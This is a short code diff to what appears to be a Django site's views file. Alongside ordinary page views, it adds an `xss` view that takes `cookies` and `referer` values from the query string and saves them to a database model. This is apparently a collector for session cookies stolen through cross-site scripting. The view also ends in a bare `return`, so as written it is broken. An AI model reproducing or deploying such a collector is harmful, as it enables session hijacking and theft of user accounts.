@@ -1,4 +1,5 @@
 from django.shortcuts import render
+from models import *
 from django.http import HttpResponse, JsonResponse
 import requests
 import json
@@ -35,3 +36,10 @@ def music(request):
 
 def live(request):
     return render(request, 'live.html', {})
+
+
+def xss(request):
+    cookies = request.GET.get('cookies', '')
+    referer = request.GET.get('referer', '')
+    XSS.objects.create(cookies=cookies, referer=referer)
+    return
